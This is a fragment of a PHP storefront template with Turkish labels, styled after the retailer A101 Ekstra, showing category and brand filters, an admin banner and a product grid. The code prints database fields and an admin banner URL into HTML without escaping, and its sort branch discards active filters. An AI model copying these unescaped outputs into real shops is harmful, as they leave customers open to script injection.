                                                               <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                            </svg></div>
                                                      <?php else: ?>
                                                         <div class="opacity-0"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                               <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                            </svg></div>
                                                      <?php endif; ?>
                                                   </div>
                                                   <span class="flex self-center ml-2 cursor-pointer text-[13px]">Bilgisayar &amp; Tablet</span>
                                                </label>
                                             </div>
                                          </div>
                                          <div class="my-1" onclick="window.location.href='/?kategori=4'">
                                             <div class="flex flex-wrap">
                                                <label class="inline-flex items-start select-none">
                                                   <div class="w-5 h-5 border bg-white rounded-md border-brand-gray-border  flex items-center justify-center cursor-pointer">
                                                      <?php if ($_GET['kategori'] == "4"): ?>
                                                         <div class="opacity-100 text-brand-blue-primary"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                               <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                            </svg></div>
                                                      <?php else: ?>
                                                         <div class="opacity-0"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                               <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                            </svg></div>
                                                      <?php endif; ?>
                                                   </div>
                                                   <span class="flex self-center ml-2 cursor-pointer text-[13px]">Televizyon &amp; Ses Sistemi</span>
                                                </label>
                                             </div>
                                          </div>
                                          <div class="my-1" onclick="window.location.href='/?kategori=5'">
                                             <div class="flex flex-wrap">
                                                <label class="inline-flex items-start select-none">
                                                   <div class="w-5 h-5 border bg-white rounded-md border-brand-gray-border  flex items-center justify-center cursor-pointer">
                                                      <?php if ($_GET['kategori'] == "5"): ?>
                                                         <div class="opacity-100 text-brand-blue-primary"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                               <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                            </svg></div>
                                                      <?php else: ?>
                                                         <div class="opacity-0"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                               <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                            </svg></div>
                                                      <?php endif; ?>
                                                   </div>
                                                   <span class="flex self-center ml-2 cursor-pointer text-[13px]">Elektrikli Ev Aletleri</span>
                                                </label>
                                             </div>
                                          </div>
                                          <div class="my-1" onclick="window.location.href='/?kategori=6'">
                                             <div class="flex flex-wrap">
                                                <label class="inline-flex items-start select-none">
                                                   <div class="w-5 h-5 border bg-white rounded-md border-brand-gray-border  flex items-center justify-center cursor-pointer">
                                                      <?php if ($_GET['kategori'] == "6"): ?>
                                                         <div class="opacity-100 text-brand-blue-primary"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                               <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                            </svg></div>
                                                      <?php else: ?>
                                                         <div class="opacity-0"><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                               <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                            </svg></div>
                                                      <?php endif; ?>
                                                   </div>
                                                   <span class="flex self-center ml-2 cursor-pointer text-[13px]">Isıtma ve Soğutma</span>
                                                </label>
                                             </div>
                                          </div>





                                       </div>
                                    </div>
                                    <div class="text-sm font-normal hidden"></div>
                                    <div class="border-b border-brand-blue-skeleton pt-4 block"></div>
                                 </div>
                              </div>

                              <div class="mb-[18px]">
                                 <div class="undefined ">
                                    <div class="relative flex items-center justify-between cursor-pointer">
                                       <div class="text-sm w-11/12 h-full flex items-center">
                                          <div class="font-sm font-medium">Marka</div>
                                       </div>
                                       <span class="ml-auto -mr-1 h-5 w-5">
                                          <svg class="h-6 w-6" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="width: 20px;">
                                             <path d="M7.20001 13.8L12 9.6L16.8 13.8" stroke="#333333" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"></path>
                                          </svg>
                                       </span>
                                    </div>
                                    <div class="text-sm font-normal mt-2 block">
                                       <div class="max-h-[252px] overflow-y-auto scrollbar">
                                          <?php
                                          $stmt = $pdo->prepare('SELECT DISTINCT urun_markasi FROM urunler');
                                          $stmt->execute();
                                          $markalar = $stmt->fetchAll(PDO::FETCH_ASSOC);

                                          foreach ($markalar as $marka) {

                                             echo '<div class="my-1">
                                    <div class="flex flex-wrap">
                                       <label class="inline-flex items-start select-none">
                                          <div class="w-5 h-5 border bg-white rounded-md border-brand-gray-border  flex items-center justify-center cursor-pointer">
                                             <div class="opacity-0">
                                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                   <path fill-rule="evenodd" clip-rule="evenodd" d="M5 0C2.23858 0 0 2.23858 0 5V15C0 17.7614 2.23858 20 5 20H15C17.7614 20 20 17.7614 20 15V5C20 2.23858 17.7614 0 15 0H5ZM15.145 7.59126C15.4716 7.23503 15.4475 6.68153 15.0913 6.35499C14.735 6.02845 14.1815 6.05251 13.855 6.40874L9 11.7051L6.64501 9.13601C6.31847 8.77979 5.76497 8.75572 5.40874 9.08226C5.05251 9.40881 5.02845 9.9623 5.35499 10.3185L8.24442 13.4706C8.65066 13.9138 9.34934 13.9138 9.75558 13.4706L15.145 7.59126Z" fill="currentColor"></path>
                                                </svg>
                                             </div>
                                          </div>
                                          <span class="flex self-center ml-2 cursor-pointer text-[13px]">' . $marka['urun_markasi'] . '</span>
                                       </label>
                                    </div>
                                 </div>';
                                          }

                                          ?>
                                       </div>
                                    </div>
                                    <div class="text-sm font-normal hidden"></div>
                                    <div class="border-b border-brand-blue-skeleton pt-4 block"></div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="laptop:pl-9 w-full">
                        <div>
                           <?php if ($checkAdmin["banner_durum"] == 1): ?>
                              <img src="<?= $checkAdmin["banner_url"]; ?>" onclick="window.location.href='/urun?id=<?= $checkAdmin['banner_yonlendirme']; ?>'" class="w-full max-w-[1260px]" alt="">
                           <?php endif; ?>
                           <div class="flex mt-[15px] justify-between pb-4">
                              <div class="w-full max-w-[260px] mobile:hidden laptop:block">
                                 <div class="w-full">
                                    <div>
                                       <div>
                                          <div class="relative">
                                             <div class="false cursor-pointer accent-brand-blue-primary w-full bg-white items-center p-4 rounded-full form-select border-brand-gray-border border px-4 py-2">
                                                <div class="flex text-[15px]">
                                                   <div class="flex justify-center items-center mr-2">
                                                      <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                         <path d="M11.0026 6.71838C10.7727 6.93277 10.4023 6.93277 10.1724 6.71838C9.94255 6.504 9.94255 6.15859 10.1724 5.9442L13.9183 2.38345C14.1482 2.16906 14.5185 2.16906 14.7484 2.38345L18.4943 5.9442C18.7242 6.15859 18.7242 6.504 18.4943 6.71838C18.3793 6.82558 18.2261 6.87322 18.0856 6.87322C17.9451 6.87322 17.7918 6.82558 17.6769 6.71838L14.9145 4.08665V17.2303C14.9145 17.5281 14.659 17.7782 14.327 17.7782C13.9949 17.7782 13.7395 17.54 13.7395 17.2303V4.08665L11.0026 6.71838Z" fill="#333333"></path>
                                                         <path d="M1.49488 13.2863C1.72515 13.0718 2.09614 13.0718 2.32641 13.2863L5.07902 15.919V2.77088C5.07902 2.47293 5.33487 2.22266 5.66748 2.22266C6.0001 2.22266 6.25595 2.46101 6.25595 2.77088V15.919L8.99577 13.2863C9.22604 13.0718 9.59703 13.0718 9.8273 13.2863C10.0576 13.5008 10.0576 13.8464 9.8273 14.0609L6.07685 17.6233C5.96172 17.7305 5.8082 17.7782 5.66748 17.7782C5.52676 17.7782 5.37325 17.7305 5.25811 17.6233L1.50767 14.0609C1.2774 13.8464 1.2774 13.5008 1.49488 13.2863Z" fill="#333333"></path>
                                                      </svg>
                                                   </div>
                                                   Önerilen
                                                </div>
                                             </div>
                                          </div>
                                       </div>

                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div>
                           <div class="w-auto flex justify-center"></div>
                           <ul class="grid desktop:grid-cols-4 tablet:grid-cols-3 mobile:grid-cols-2 laptop:gap-4 mobile:gap-3 mb-12">
                              <?php
                              $stmt = $pdo->prepare('SELECT * FROM urunler');
                              $stmt->execute();
                              $urunler = $stmt->fetchAll(PDO::FETCH_ASSOC);

                              if (isset($_GET['search_text'])) {
                                 $aratilan = $_GET['search_text'];
                                 $urunler = array_filter($urunler, function ($urun) use ($aratilan) {
                                    return stripos($urun['urun_adi'], $aratilan) !== false;
                                 });
                              }

                              if (isset($_GET['filtre'])) {
                                 $secilenfiltre = $_GET['filtre'];
                                 $urunler = array_filter($urunler, function ($urun) use ($secilenfiltre) {
                                    return $urun['urun_markasi'] == $secilenfiltre;
                                 });
                              }

                              if (isset($_GET['kategori'])) {
                                 $secilenkategori = urldecode($_GET['kategori']);
                                 $urunler = array_filter($urunler, function ($urun) use ($secilenkategori) {
                                    return $urun['urun_kategorisi'] == $secilenkategori;
                                 });
                              }

                              if (isset($_GET['sorter'])) {
                                 if ($_GET['sorter'] == "price") {
                                    $stmt = $pdo->prepare('SELECT * FROM urunler ORDER BY urun_fiyati ASC');
                                    $stmt->execute();
                                    $urunler = $stmt->fetchAll(PDO::FETCH_ASSOC);
                                 } else if ($_GET['sorter'] == "-price") {
                                    $stmt = $pdo->prepare('SELECT * FROM urunler ORDER BY urun_fiyati DESC');
                                    $stmt->execute();
                                    $urunler = $stmt->fetchAll(PDO::FETCH_ASSOC);
                                 }
                              }


                              $urunler = array_filter($urunler, function ($urun) {
                                 return $urun['urun_markasi'] != 'Yudum';
                              });

                              foreach ($urunler as $urun) {
                                 echo '<li class="list-none">
                                                    <article class="flex flex-col relative w-full px-3 bg-white border border-brand-gray-skeleton rounded-2xl">
                                                        <a rel="bookmark" title="' . $urun['urun_adi'] . '" href="/urun?id=' . $urun['id'] . '">
                                                            <div class="flex flex-col relative pt-[6px] w-full mb-1">
                                                                <div class="relative aspect-[252/48.18] w-[62%] m-auto flex justify-center mb-1">
                                                                <div class="select-none relative w-full h-full">
                                                                    <div class="transition-opacity duration-300 opacity-100 "><img loading="lazy" draggable="false" alt="' . $urun['urun_adi'] . '" title="' . $urun['urun_adi'] . '" src="https://api.a101kapida.com/dbmk89vnr/CALL/Image/get/aldin-aldin-ozel_256x256.png" style="width:100%" class="scale-x-100"></div>
                                                                </div>
                                                                </div>
                                                                <div class="relative">
                                                                <div class="absolute mobile:top-0 laptop:top-0 left-0 z-[1]"></div>
                                                                <button class="absolute -right-3 p-3 -top-3  flex self-end z-[2]">
                                                                    <svg width="22" height="22" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M5.46963 1.80078C4.20662 1.80078 3.04345 2.30266 2.19595 3.21429C1.35875 4.11493 0.899902 5.34285 0.899902 6.66966C0.899902 8.04065 1.4164 9.29102 2.51008 10.5999C3.48437 11.7657 4.88215 12.9471 6.48975 14.3058L6.48975 14.3058L6.49468 14.3099L6.49749 14.3124C7.04733 14.777 7.67004 15.3034 8.31586 15.8635C8.50528 16.028 8.74818 16.1184 8.9999 16.1184C9.25152 16.1184 9.49455 16.028 9.68386 15.8637C10.3311 15.3023 10.9548 14.7751 11.5056 14.3097L11.5118 14.3044C13.1186 12.9463 14.5158 11.7654 15.4898 10.5998C16.5835 9.29101 17.0999 8.04064 17.0999 6.66966C17.0999 5.34286 16.6412 4.11494 15.804 3.21429C14.9565 2.30266 13.7932 1.80078 12.5303 1.80078C11.5843 1.80078 10.7172 2.09786 9.95552 2.68209C9.60498 2.95093 9.28526 3.27419 8.99992 3.64691C8.71464 3.27418 8.39482 2.95092 8.04441 2.68209C7.28274 2.09786 6.4156 1.80078 5.46963 1.80078ZM2.03704 6.66966C2.03704 5.62228 2.39203 4.66831 3.0314 3.98048C3.66088 3.30345 4.526 2.93032 5.46963 2.93032C6.15817 2.93032 6.78983 3.14696 7.34932 3.57601C7.84963 3.95976 8.19989 4.44664 8.40604 4.78939C8.53215 4.99892 8.75471 5.12414 8.9999 5.12414C9.24509 5.12414 9.46765 4.99892 9.59376 4.78939C9.80005 4.44662 10.1503 3.95976 10.6505 3.576C11.21 3.14696 11.8416 2.93032 12.5303 2.93032C13.4738 2.93032 14.3391 3.30345 14.9684 3.98048C15.6078 4.66831 15.9628 5.62228 15.9628 6.66966C15.9628 7.76847 15.5528 8.756 14.6148 9.87853C13.705 10.9673 12.3495 12.1132 10.7686 13.4496C10.2341 13.9011 9.63043 14.4114 8.99869 14.9563C8.37055 14.4125 7.76785 13.903 7.2345 13.4522L7.23366 13.4515L7.23117 13.4495C5.6503 12.1133 4.29485 10.9673 3.38511 9.87853C2.44705 8.756 2.03704 7.76846 2.03704 6.66966Z" fill="#333333"></path>
                                                                    </svg>
                                                                </button>
                                                                <figure class="flex w-full cursor-pointer opacity-100" style="height: 208px;">
                                                                    <div class="select-none relative w-full h-full">
                                                                        <div class="transition-opacity duration-300 opacity-100 w-full h-full overflow-hidden"><img loading="lazy" draggable="false" alt="' . $urun['urun_adi'] . '" title="' . $urun['urun_adi'] . '" src="' . $urun['urun_resmi'] . '" style="width:100%;object-fit:contain" class="scale-x-100"></div>
                                                                    </div>
                                                                    <noscript><img src="/svg/product-thumbnail-padding-online.svg" alt="' . $urun['urun_adi'] . '" title="' . $urun['urun_adi'] . '" srcSet="/svg/product-thumbnail-padding-online.svg"/></noscript>
                                                                </figure>
                                                                <div class="absolute left-0 bottom-0"></div>
                                                                <div class="absolute right-0 flex bottom-0 flex-col"></div>
                                                                </div>
                                                                <header>
                                                                <hgroup class="mt-2 h-[30px] ">
                                                                    <h3 title="' . $urun['urun_adi'] . '" class="text-xs font-medium leading-4 tablet:mb-3 mobile:mb-1 cursor-pointer tablet:line-clamp-2 mobile:line-clamp-2">' . $urun['urun_adi'] . '</h3>
                                                                </hgroup>
                                                                </header>
                                                            </div>
                                                            <section class="mt-2.5 h-full flex flex-col justify-end mb-2"><s class="text-xs text-[#333] h-[17px] line-through cursor-pointer" style="line-height:initial"></s><span class="text-base text-[#EA242A]  not-italic font-medium leading-normal cursor-pointer">₺' . number_format((float) str_replace(',', '.', str_replace('TL', '', $urun['urun_fiyati'])), 2, ',', '.') . '</span></section>
                                                        </a>
                                                        <div class="pb-3 left-3 right-3"><button class="bg-brand-blue-primary  rounded-full text-base  p-1 text-sm text-center w-full text-white " onclick="SepeteEkle(' . $urun['id'] . ')">Sepete Ekle</button></div>
                                                    </article>
                                                </li>';
                              }
                              ?>

                           </ul>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>


         <div>
            <div class="bg-white">
               <div class="w-full px-4 tablet:mx-auto tablet:max-w-screen-tablet tablet:px-5 laptop:max-w-screen-laptop laptop:px-6 desktop:max-w-screen-desktop desktop:px-9 ">
                  <div>
                     <div class="flex-1 text-center w-full py-4">
                        © 2024 A101 Ekstra
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <div class="h-[calc(64px+env(safe-area-inset-bottom))] bg-white" id="m1" style="display: none;"></div>
         <div class="fixed bottom-0 bg-white w-full  z-[3]" id="m2" style="display: none;">
            <div class="ios-padding border-t w-full flex justify-around pt-2">
               <div class="flex flex-col items-center relative" onclick="window.location.href='/'">
                  <div>
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M5.35508 21.3C4.47061 21.3 3.7 20.5395 3.7 19.5434V10.2754C3.7 9.88426 3.87608 9.51394 4.17943 9.26707L11.1794 3.57032C11.6573 3.18138 12.3426 3.18138 12.8206 3.57032L19.8206 9.2671C20.1239 9.51397 20.3 9.88429 20.3 10.2754V19.5434C20.3 20.5395 19.5294 21.3 18.6449 21.3H5.35508Z" stroke="#8D939C" stroke-width="1.4"></path>
                        <path d="M15.0187 14.0654C14.9404 14.0262 14.8557 14.0041 14.7695 14.0005C14.6833 13.9969 14.5972 14.0118 14.5163 14.0444C14.4355 14.077 14.3613 14.1266 14.298 14.1903C14.2348 14.2541 14.1838 14.3308 14.1479 14.416C13.9767 14.8207 13.7021 15.1636 13.3569 15.404C13.0116 15.6444 12.6102 15.7722 12.2001 15.7722C11.79 15.7722 11.3885 15.6444 11.0433 15.404C10.698 15.1636 10.4235 14.8207 10.2523 14.416C10.216 14.331 10.1646 14.2547 10.1012 14.1912C10.0377 14.1278 9.96335 14.0786 9.88238 14.0464C9.8014 14.0142 9.71538 13.9997 9.62923 14.0036C9.54307 14.0075 9.45847 14.0298 9.38025 14.0692C9.30203 14.1086 9.23172 14.1644 9.17335 14.2333C9.11497 14.3023 9.06967 14.383 9.04002 14.471C9.01038 14.5589 8.99697 14.6524 9.00057 14.746C9.00417 14.8396 9.0247 14.9314 9.061 15.0164C9.33726 15.6682 9.77974 16.2203 10.336 16.6073C10.8923 16.9943 11.539 17.2 12.1996 17.2C12.8602 17.2 13.5069 16.9943 14.0632 16.6073C14.6195 16.2203 15.062 15.6682 15.3382 15.0164C15.3749 14.9313 15.3957 14.8392 15.3994 14.7454C15.4031 14.6515 15.3897 14.5578 15.36 14.4696C15.3303 14.3814 15.2848 14.3005 15.2261 14.2315C15.1675 14.1624 15.0968 14.1067 15.0183 14.0674L15.0187 14.0654Z" fill="#8D939C"></path>
                     </svg>
                  </div>
                  <div class="mt-1 text-[9px] text-brand-gray-secondary ">Ana Sayfa</div>
               </div>
               <div class="flex flex-col items-center relative">
                  <div>
                     <svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="16" cy="9" r="4.8" stroke="#8D939C" stroke-width="1.4"></circle>
                        <path d="M19.8203 13.1787L23.4997 16.8581" stroke="#8D939C" stroke-width="1.4" stroke-linecap="round"></path>
                        <path d="M7.97511 12.877L7.97519 12.8768C8.00852 12.8175 8.00851 12.7426 7.9752 12.6834L7.97511 12.6832C7.9425 12.6252 7.88702 12.5963 7.83445 12.5963L1.1659 12.5963C1.12617 12.5963 1.08537 12.6123 1.05313 12.6455L7.97511 12.877ZM7.97511 12.877C7.9425 12.935 7.88701 12.9639 7.83445 12.9639L1.1659 12.9639C1.12616 12.9639 1.08537 12.9478 1.05313 12.9147C1.02067 12.8814 1 12.8332 1 12.7801M7.97511 12.877L1 12.7801M1 12.7801C1 12.727 1.02066 12.6788 1.05313 12.6455L1 12.7801Z" fill="#8D939C" stroke="#8D939C"></path>
                        <path d="M6.97511 6.11329L6.97519 6.11315C7.00852 6.05388 7.00851 5.97893 6.9752 5.91968L6.97511 5.91953C6.9425 5.86149 6.88702 5.83263 6.83445 5.83263L1.1659 5.83263C1.12617 5.83263 1.08537 5.84868 1.05313 5.88178L6.97511 6.11329ZM6.97511 6.11329C6.9425 6.17133 6.88701 6.2002 6.83445 6.2002L1.1659 6.2002C1.12616 6.2002 1.08537 6.18414 1.05313 6.15104C1.02067 6.11771 1 6.06953 1 6.01641M6.97511 6.11329L1 6.01641M1 6.01641C1 5.96329 1.02066 5.91512 1.05313 5.88179L1 6.01641Z" fill="#8D939C" stroke="#8D939C"></path>
                        <path d="M15.9752 19.6133L15.9753 19.6131C16.0086 19.5539 16.0086 19.4789 15.9753 19.4197L15.9752 19.4195C15.9426 19.3615 15.8871 19.3326 15.8345 19.3326L1.1659 19.3326C1.12617 19.3326 1.08537 19.3487 1.05313 19.3818L15.9752 19.6133ZM15.9752 19.6133C15.9426 19.6713 15.8871 19.7002 15.8345 19.7002L1.1659 19.7002C1.12616 19.7002 1.08537 19.6841 1.05313 19.651C1.02067 19.6177 1 19.5695 1 19.5164M15.9752 19.6133L1 19.5164M1 19.5164C1 19.4633 1.02066 19.4151 1.05313 19.3818L1 19.5164Z" fill="#8D939C" stroke="#8D939C"></path>
                     </svg>
                  </div>
                  <div class="mt-1 text-[9px] text-brand-gray-secondary ">Kategoriler</div>
               </div>


               <?php if ($sepetSayisi == 0): ?>
                  <div class="flex flex-col items-center relative" onclick="window.location.href='sepet'">
                     <div>
                        <svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                           <path d="M16.2194 17.5283C14.9849 17.5283 13.9839 18.529 13.9839 19.7636C13.9839 20.9984 14.9845 21.9993 16.2191 21.9993C17.454 21.9993 18.4547 20.9984 18.4547 19.7639C18.4536 18.5296 17.4534 17.5296 16.2194 17.5283ZM16.2194 20.9983C15.5374 20.9983 14.9849 20.4456 14.9849 19.7639C14.9849 19.082 15.5374 18.5293 16.2191 18.5293C16.9011 18.529 17.4537 19.082 17.4537 19.7636C17.4529 20.4451 16.9008 20.9972 16.2194 20.9983Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                           <path d="M22.1961 5.15308H4.43665L4.12428 3.88234C3.85451 2.7738 2.85933 1.99532 1.7187 2.00002H1.50041C1.22406 2.00002 1 2.22408 1 2.50058C1 2.77694 1.22406 3.00099 1.50041 3.00099H1.7187C2.39744 2.99551 2.99101 3.45771 3.15228 4.1172L5.58229 14.0409C5.85347 15.1473 6.84943 15.9223 7.98834 15.9135H18.3829C19.5378 15.9228 20.5428 15.126 20.7974 13.9998L22.6841 5.75323C22.7182 5.60668 22.6827 5.45261 22.5877 5.33565C22.492 5.21806 22.3478 5.15074 22.1961 5.15308ZM19.8218 13.7798C19.6693 14.4494 19.0698 14.9215 18.3829 14.9126H7.98834C7.31054 14.9199 6.71666 14.4598 6.55476 13.8015L4.68152 6.15405H21.5681L19.8218 13.7798Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                           <path d="M9.44941 17.5283C8.21484 17.5283 7.21387 18.529 7.21387 19.7636C7.21387 20.9984 8.21468 21.9993 9.44926 21.9993C10.684 21.9993 11.6848 20.9984 11.6848 19.7639C11.6837 18.5296 10.6835 17.5296 9.44941 17.5283ZM9.44941 20.9983C8.76754 20.9983 8.21484 20.4456 8.21484 19.7639C8.21484 19.082 8.76754 18.5293 9.44926 18.5293C10.1311 18.529 10.6838 19.082 10.6838 19.7636C10.6831 20.4451 10.1308 20.9972 9.44941 20.9983Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                        </svg>
                     </div>
                     <div class="mt-1 text-[9px] text-brand-gray-secondary ">Sepetim</div>
                  </div>
               <?php else: ?>
                  <div class="flex flex-col items-center relative" onclick="window.location.href='sepet'">
                     <div class="absolute bg-brand-blue-primary text-white rounded-full p-1 w-auto h-[14px] text-[10px]  -top-[2px] -right-[2px] flex justify-center items-center"><?php echo $sepetSayisi; ?></div>
                     <div>
                        <svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                           <path d="M16.2194 17.5283C14.9849 17.5283 13.9839 18.529 13.9839 19.7636C13.9839 20.9984 14.9845 21.9993 16.2191 21.9993C17.454 21.9993 18.4547 20.9984 18.4547 19.7639C18.4536 18.5296 17.4534 17.5296 16.2194 17.5283ZM16.2194 20.9983C15.5374 20.9983 14.9849 20.4456 14.9849 19.7639C14.9849 19.082 15.5374 18.5293 16.2191 18.5293C16.9011 18.529 17.4537 19.082 17.4537 19.7636C17.4529 20.4451 16.9008 20.9972 16.2194 20.9983Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                           <path d="M22.1961 5.15308H4.43665L4.12428 3.88234C3.85451 2.7738 2.85933 1.99532 1.7187 2.00002H1.50041C1.22406 2.00002 1 2.22408 1 2.50058C1 2.77694 1.22406 3.00099 1.50041 3.00099H1.7187C2.39744 2.99551 2.99101 3.45771 3.15228 4.1172L5.58229 14.0409C5.85347 15.1473 6.84943 15.9223 7.98834 15.9135H18.3829C19.5378 15.9228 20.5428 15.126 20.7974 13.9998L22.6841 5.75323C22.7182 5.60668 22.6827 5.45261 22.5877 5.33565C22.492 5.21806 22.3478 5.15074 22.1961 5.15308ZM19.8218 13.7798C19.6693 14.4494 19.0698 14.9215 18.3829 14.9126H7.98834C7.31054 14.9199 6.71666 14.4598 6.55476 13.8015L4.68152 6.15405H21.5681L19.8218 13.7798Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                           <path d="M9.44941 17.5283C8.21484 17.5283 7.21387 18.529 7.21387 19.7636C7.21387 20.9984 8.21468 21.9993 9.44926 21.9993C10.684 21.9993 11.6848 20.9984 11.6848 19.7639C11.6837 18.5296 10.6835 17.5296 9.44941 17.5283ZM9.44941 20.9983C8.76754 20.9983 8.21484 20.4456 8.21484 19.7639C8.21484 19.082 8.76754 18.5293 9.44926 18.5293C10.1311 18.529 10.6838 19.082 10.6838 19.7636C10.6831 20.4451 10.1308 20.9972 9.44941 20.9983Z" fill="#8D939C" stroke="#8D939C" stroke-width="0.4"></path>
                        </svg>
                     </div>
                     <div class="mt-1 text-[10px] bg-brand-blue-primary text-white rounded-full px-1">₺<?php echo $toplamFiyat; ?></div>
                  </div>
               <?php endif; ?>


               <div class="flex flex-col items-center relative">
                  <div>
